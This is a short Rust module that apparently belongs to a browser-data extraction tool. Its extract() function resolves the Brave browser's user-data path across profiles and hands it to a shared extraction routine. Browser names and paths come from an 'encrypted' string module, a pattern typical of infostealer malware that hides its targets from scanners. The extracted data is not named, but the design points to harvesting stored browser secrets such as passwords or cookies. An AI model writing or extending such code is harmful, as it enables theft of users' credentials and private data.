use super::base;
use crate::encrypted::*;

pub fn extract() -> Vec<(String, String)> {
    let user_data = crate::browsers::common::paths::user_data_path(
        &crate::browsers::common::paths::BrowserPath {
            name: s_browser_brave(),
            exe: s_path_brave_exe(),
            user_data_rel: s_path_brave_ud_rel(),
            root: crate::browsers::common::paths::DataRoot::Local,
            has_profiles: true,
        }
    );
    base::extract_for_browser(&s_browser_brave(), &user_data, true)
}
